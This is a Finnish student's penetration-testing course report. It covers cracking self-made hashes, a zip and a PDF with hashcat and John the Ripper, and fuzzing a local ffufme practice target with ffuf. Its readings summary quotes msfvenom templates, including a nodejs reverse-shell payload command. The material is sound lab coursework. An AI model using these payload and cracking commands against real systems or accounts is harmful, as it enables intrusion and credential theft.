# [H4 Marraskuu2024!](https://terokarvinen.com/tunkeutumistestaus/#h4-marraskuu2024) (Karvinen 2024)

## x)  Lue/katso ja tiivistä.

### Cracking Passwords with Hashcat (Karvinen 2022)

- salasanat tallennettu tiivisteinä
  - tiivisteitä testataan sanalistoja vastaan
- hashcatia asennettaessa kannattaa myös asentaa hashid
  - hashid auttaa selvittämään tiivisteen algoritmi
- hashcatin tavanomainen käyttö
  - `hashcat -m [algoritmin hashcat id] '[tiiviste]' [sanalista] -o [tiedostonimi outputille]`

### Crack File Password With John (Karvinen 2023)

- John the Ripperillä voidaan murtaa tiedostojen salauksia
- binääri täytyy itse kääntää lähdekoodista
- kloonaa git repo, tarkista ympäristö ja tee Makefile(./configure), käännä lähdekoodi (make, ks. Makefilestä oikeat komennot ja parametrit)
- johnin tavanomainen käyttö tiedoston salauksen purkamiseen
  - tiedostosta tiivste irti
    - `polku/john/run/zip2john [tiedosto] >[tiedosto].hash`
  - aja john
    - `polku/john/run/john [tiedosto].hash`

### Security Penetration Testing - The Art of Hacking Series LiveLessons: Lesson 6: Hacking User Credentials (Santos et al. 2017)

- helppo tapa saada käyttäjätunnuksia on napata niitä suojaamattomasta verkosta (esim. kahvilan wifi hotspot)
- murrettavia tunnuksia voi saada myös nmapin skripteillä, metasploit moduuleilla tai esim. yksinkertaisesti palvelimelta kysymällä
- johnin ja hashcatin käyttöä
- suojautuminen:
  - käyttäjä/kuluttaja: älä käytä samaa salasanaa, ota käyttöön MFA kun mahdollista, käytä pidempiä salasanoja, älä käytä sanakirjaa
  - organisaatiot: MFA-tuki, älä rajaa salasanojen pituutta liian lyhyeksi, pitää olla tietoinen hyvistä ja huonoista tiivistealgoritmeistä, salasanojen suolaus, sertifikaattiperusteinen autentikointi (public-key algoritmit)

### HackTricks: MSFVenom - CheatSheet (HackTricks 2024)

- perushomma
  - ``msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>``
- nodejs
  - ``msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)``
  - minulle on epäselvää, missä tilanteessa tätä voitaisiin hyödyntää?

## a) Asenna Hashcat ja testaa sen toiminta murtamalla esimerkkisalasana.

Kali virtuaalikoneella:

    sudo apt update
    sudo apt install hashcat hashid   # tullut Kalin mukana, mutta todentaa ohjelmien olevan uusimmat versiot

Hashcatia varten ladataan vielä sanalista. Käytetään `rockyou.txt`. Googlasin "rockyou" ja valitsin ensimmäisen osuman. Käytin `wget` komentoa terminaalissa.

![image](https://github.com/user-attachments/assets/b4e7cbc1-0c74-4c22-8c84-5f6c01344336)
> Kuva 1. Sanalistan lataaminen.

Luodaan esimerkkitiiviste (tarkastin komennon [täältä](https://askubuntu.com/a/53852) (guntbert 2015)) ja identifioidaan käytettyä tiivistealgoritmi.

![image](https://github.com/user-attachments/assets/68065b15-1e4c-41eb-a77a-66845c8e9db7)
> Kuva 2. Testasin ettei lainausmerkit vaikuta tulosteeseen.

![image](https://github.com/user-attachments/assets/f9f16d9b-d0ff-4b19-b74f-5e92bdec9b30)
> Kuva 3. Md5 löytyy top 3:sta.

Ajoin kuvan 3 komennon toistamiseen lipulla `-m`, joka näyttää algoritmin hashcat moden numeron (`man hashid`).

`MD5 [Hashcat Mode: 0]`

![image](https://github.com/user-attachments/assets/df968a07-7ae5-4565-a233-670104e00a1b)
> Kuva 6. Murtaminen alkaa.

![image](https://github.com/user-attachments/assets/831f5c02-5d2e-4c0b-9b87-2ec9ad758622)
> Kuva 5. Muisti loppuu kesken.

Sammutetaan kone ja lisätään boxiin lisää muistia (2048 MB -> 4096 MB).

![image](https://github.com/user-attachments/assets/0b9cc91a-be05-403a-9415-65e2150adc99)
> Kuva 6. Valitun koneen muistin lisääminen. Oikea valikko aukeaa painamalla 'Settings' painiketta ja navigoimalla 'System' näkymään.

Käynnistetään kone uudelleen ja kokeillaan kuvassa 6 näkyvää komentoa uudestaan. Uuden terminaalin avaamisen (Left Ctrl + Alt + T) voi painaa pari kertaa nuolinäppäintä ylös, jotta saadaan täsmälleen sama käytetty komento uudelleen.

![image](https://github.com/user-attachments/assets/82f5132c-f931-4344-9e5a-7831d5a5a55b)
> Kuva 7. Cracked!

![image](https://github.com/user-attachments/assets/4f45ab65-90b0-4950-a6e6-0281c9c007de)
> Kuva 8. Data tallessa tiedostossa.

## b) Asenna John the Ripper ja testaa sen toiminta murtamalla jonkin esimerkkitiedoston salasana.

Tarkistin komennot samasta Teron artikkelista, josta kohdassa x) tehtiin lyhyt tiivistelmä (Karvinen 2023).

    git clone --depth=1 https://github.com/openwall/john.git
    cd john/src/	
    ./configure

![image](https://github.com/user-attachments/assets/b0581dc6-1c7e-4568-b477-d976f4c4b01b)
> Kuva 9. Eka `./configure`.

Ensimmäinen konfigurointi (eli ympäristön/kirjastojen tarkistus) päättyi virheilmoitukseen openssl:n puuttumisesta. En ymmärtänyt oikean paketin nimen olevan `libssl-dev`. Löysin apua [täältä](https://stackoverflow.com/a/34818789) (Kilzer 2018).

    sudo apt-get update
    sudo apt-get install libssl-dev
    ./configure

Toisella `./configure` ajolla koodin todetaan olevan ok käännettäväksi. Mutta kaikkia Johnin toimintoja ei ole käytössä puuttuvien kirjastojen takia (ks. kuva alla).

![image](https://github.com/user-attachments/assets/4715e42e-49d2-4f29-ad6f-17b4a2b20823)
> Kuva 10. Toka `./configure`.

Kuvan 10 tuloste kehottaa seuraavaksi ajamaan `make` komennon kahdesti eri argumentein. Käytän Teron ohjeen (Karvinen 2023) mukaan `-sj2` tilalla `-sj4`.

    make -s clean && make -sj4

![image](https://github.com/user-attachments/assets/4b46f92b-b176-44c2-80a4-e7ec3beb4951)
> Kuva 11. Käännetty.

Kokeillaan onko John the Ripper asennettu.

    cd ../run
    john

![image](https://github.com/user-attachments/assets/ac2acbdd-b88d-44c1-97e2-8ab3d6eded01)
> Kuva 12. John juoksee.

Seuraavaksi itse asiaan, tiedoston salasanan murtamiseen. Luodaan ensiksi salasanasuojattu zip-tiedosto.

![image](https://github.com/user-attachments/assets/cfd6f406-6b5c-45ad-a9b7-6bb5fc2ddd88)
> Kuva 13. `zip -h2 | less` Less lukuohjelmassa syöte "/password".

![image](https://github.com/user-attachments/assets/96cc432a-1dd6-40b4-8e95-947e30f57134)
> Kuva 14. Zipping.

![image](https://github.com/user-attachments/assets/8364a908-01b1-4ce6-b8cb-4075cae8e9b0)
> Kuva 15. Ote historiasta. Manuaalia tutkimalla oikea komento ei ihan heti löytynyt.

Nyt on kotihakemistoon luotu loot.zip. Kokeillaan purkaa se ja katsotaan mitä tapahtuu väärällä salasanalla tai kysytäänkö sitä ollenkaan.

![image](https://github.com/user-attachments/assets/485b62a9-8f13-4180-a114-302ad80b3821)
> Kuva 16. Salasanaa kysytään ja annetaan se väärin.

Näyttää siltä, että hakemiston jokainen tiedosto on suojattu salasanalla. Kokeillaan murtaa se Johnilla.

    cd ~/john/run
    zip2john ~/loot.zip > ~/loot.zip.hash    # tarkistettu artikkelista (Karvinen 2023)
    john ~/loot.zip.hash

Tiivisteen erottamisessa john osaa oikein päätellä/olettaa, että salasana on sama joka tiedostossa.

![image](https://github.com/user-attachments/assets/6c0260a7-adee-491c-b22e-5495a0f30684)
> Kuva 17. Murrettu! Salasana: data.

![image](https://github.com/user-attachments/assets/a18aa86b-6282-4ad9-b442-9398f71e4ab4)
> Kuva 18. Salasanan syöttäminen purkaa zip-tiedoston.

## c) Fuffme. Asenna Ffufme harjoitusmaali paikallisesti omalle koneellesi. Ratkaise tehtävät (kaikki paitsi ei "Content Discovery - Pipes")

### Asennukset

Seurataan Teron ohjeita harjoitusmaalin ja muiden vaatimusten asentamiseksi (Karvinen 2023b).

    sudo apt-get install docker.io
    git clone https://github.com/adamtlangley/ffufme
    cd ffufme/
    sudo docker build -t ffufme .
    sudo docker run -d -p 80:80 ffufme

![image](https://github.com/user-attachments/assets/3e140e1d-4375-41bf-841b-157b9347e741)
> Kuva 19. Target acquired.

Asennetaan vielä lisää sanalistoja. Ohjeissa mainittu `common.txt` löytyy jo.

![image](https://github.com/user-attachments/assets/1840710e-a294-4bea-8014-a7b765450ea9)
> Kuva 20. Sanalistat haettu.

Otetaan kone irti internetistä varmuuden vuoksi.

![image](https://github.com/user-attachments/assets/d6d79779-7dfe-4c80-a116-7cb25da0b7f2)
> Kuva 21. NATattu liitin pois päältä. Kohde vielä pystyssä.

### Basic Content Discovery

Kalin Z shell ystävällisesti näytti edellisen käytetyn `ffuf` komennon, josta oli helppo muuttaa url-argumentti. Eka ajo meni kuitenkin pieleen, kun en spesifioinut käytettävää protokollaa (http://).

![image](https://github.com/user-attachments/assets/4190fee7-fe73-4005-aabc-82ace3ae7ff8)
> Kuva 22. Basic Content Discovery suoritettu.

### Content Discovery With Recursion

Lippu `-recursion` fuzzaa löydetyn hakemiston.

![image](https://github.com/user-attachments/assets/4a39cb26-09c2-43ff-9c48-beea41cead28)
> Kuva 23. Rekursiivisesti.

### Content Discovery With File Extensions

![image](https://github.com/user-attachments/assets/55c62520-5946-466a-b952-626c1c4656ef)
> Kuva 24. Tiedostopäätteen kera.

### No 404 Status

Tämähän oli jo tuttu. Filteröidään koon mukaan tulokset.

![image](https://github.com/user-attachments/assets/dfdc38a9-e3fe-4f8e-ba01-4281e99e17b6)
> Kuva 25. Salaisuus löytyi.

### Param Mining

Sijoitetaan avainsana url-parametrin tilalle.

![image](https://github.com/user-attachments/assets/7e45dc19-8eeb-45f4-acf2-e9ad2ac4d960)
> Kuva 26. Paramteri löydetty.

### Rate Limited

![image](https://github.com/user-attachments/assets/12e389d3-7422-48c1-8d84-7bba8fcbb05b)
> Kuva 27. Pieni paussi pyynnöissä.

Tämä kohta herätti hieman kysymyksiä. Tauon asettamisen ymmärrän. Mutta mitä tekee `-t`, joka manuaalisivujen mukaan avaa useamman threadin eli mitä ovat threadit?

### Subdomains - Virtual Host Enumeration

![image](https://github.com/user-attachments/assets/558bacc3-b1fd-4d43-b8eb-2b7bd91bcca8)
> Kuva 28. Subdomain löydetty.

![image](https://github.com/user-attachments/assets/bf5d9df6-9b28-478b-b7ec-2cd571f06ab3)
> Kuva 29. Mitähän ne subdomainit olikaan? Lähde: https://en.wikipedia.org/wiki/Subdomain

## d) Tiedosto. Tee itse tai etsi verkosta jokin salakirjoitettu tiedosto, jonka saat auki. Murra sen salaus. (Jokin muu formaatti kuin aiemmissa alakohdissa kokeilemasi).

Aloitin listaamalla `~/john/run/` sisällön selvittääkseni formaatin, jonka voisin murtaa. Valitsin pdf:n (pdf2john). Minun piti selvittää, miten pdf salataan. [Tästä](https://security.stackexchange.com/a/183560) vastauksesta (Arminius 2018) sain selville ohjelman `qpdf` ja parametrit kryptaamiseen.

    sudo apt-get install qpdf

Luodaan uusi pdf.

    qpdf -empty -- crack.pdf  # man qpdf

Aiemmin linkkaamastani ohjeesta (Arminius 2018) komento kryptattavan pdf:n tekemiseen.

    qpdf --encrypt 123456 123456 256 crack.pdf crack_crypted.pdf

![image](https://github.com/user-attachments/assets/efb57b17-7dc0-4079-aa35-7256f0ff5ed5)
> Kuva 30. Salasanasuojattu pdf.

Tämän jälkeen otetaan tiiviste talteen kuten kohdassa b) mutta tällä kertaa eri johnin moduulilla.

![image](https://github.com/user-attachments/assets/51ded7ab-4885-4e99-8531-e10367f73847)
> Kuva 31. Tiivisteen talteenotto.

![image](https://github.com/user-attachments/assets/6f00a0bb-ebd6-4fe8-8d63-6b6ce59fd21f)
> Kuva 32. Tiiviste vuotaa.

John onnistui. Hyvä John!

## Lähteet

Arminius, 2018. Why won't pdf2john extract the password hash of this encrypted pdf? Getting blank results. Answers. Luettavissa: https://security.stackexchange.com/a/183560 Luettu: 2024-11-17

guntbert, 2015. How to get the MD5 hash of a string directly in the terminal? Answers. Luettavissa: https://askubuntu.com/questions/53846/how-to-get-the-md5-hash-of-a-string-directly-in-the-terminal Luettu: 2024-11-16

HackTricks, 2024. MSFVenom - CheatSheet. Luettavissa: https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/msfvenom Luettu: 2024-11-15

Karvinen, T. 2022. Cracking Passwords with Hashcat. Luettavissa: https://terokarvinen.com/2022/cracking-passwords-with-hashcat/ Luettu: 2024-11-15

Karvinen, T. 2023a. Crack File Password With John. Luettavissa: https://terokarvinen.com/2023/crack-file-password-with-john/ Luettu: 2024-11-15

Karvinen, T. 2023b. Fuffme - Install Web Fuzzing Target on Debian. Luettavissa: https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/ Luettu: 2024-11-17

Karvinen, T. 2024. Tunkeutumistestaus. H4 Marraskuu!. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/#h4-marraskuu2024 Luettu: 2024-11-15

Kilzer, A. 2018. OpenSSL headers missing when building OpenSSH. Answers. Luettavissa: https://stackoverflow.com/questions/30330835/openssl-headers-missing-when-building-openssh/34818789#34818789 Luettu: 2024-11-17

Santos, O., Sternstein, J., Taylor, R., McCoy, C. 2017. Security Penetration Testing The Art of Hacking Series LiveLessons. Katsottavissa (vaatii kirjautumisen): https://learning.oreilly.com/course/security-penetration-testing/9780134833989/ Katsottu: 2024-11-16
